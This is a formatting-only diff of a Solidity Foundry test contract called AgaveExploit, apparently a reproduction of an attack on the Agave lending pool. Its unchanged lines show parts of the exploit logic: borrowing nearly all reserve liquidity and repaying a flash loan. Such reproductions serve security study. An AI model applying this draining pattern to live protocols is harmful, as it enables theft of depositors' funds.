@@ -86,11 +86,15 @@ contract AgaveExploit is Test {
         lendingPool.borrow(weth, wethLiqBeforeHack, 2, 0, address(this));
     }
 
-    function _getTokenBal(address asset) internal view returns (uint256) {
+    function _getTokenBal(
+        address asset
+    ) internal view returns (uint256) {
         return IERC20(asset).balanceOf(address(this));
     }
 
-    function _logBalances(string memory message) internal {
+    function _logBalances(
+        string memory message
+    ) internal {
         console.log(message);
         console.log("--- Start of balances ---");
         emit log_named_decimal_uint("WETH Balance", _getTokenBal(weth), 18);
@@ -120,7 +124,9 @@ contract AgaveExploit is Test {
         WETH.approve(address(lendingPool), type(uint256).max);
     }
 
-    function _getAvailableLiquidity(address asset) internal view returns (uint256 reserveTokenbal) {
+    function _getAvailableLiquidity(
+        address asset
+    ) internal view returns (uint256 reserveTokenbal) {
         DataTypesAave.ReserveData memory data = lendingPool.getReserveData(asset);
         reserveTokenbal = IERC20(asset).balanceOf(address(data.aTokenAddress));
     }
@@ -180,7 +186,9 @@ contract AgaveExploit is Test {
         WETH.transfer(address(1), ((ethFlashloanAmt * 1000) / 997) + 1);
     }
 
-    function _borrow(address asset) internal {
+    function _borrow(
+        address asset
+    ) internal {
         uint256 reserveTokenbal = _getAvailableLiquidity(asset);
         uint256 BorrowAmount = reserveTokenbal > 2 ? reserveTokenbal - 1 : 0;
         if (BorrowAmount > 0) lendingPool.borrow(asset, BorrowAmount, 2, 0, address(this));
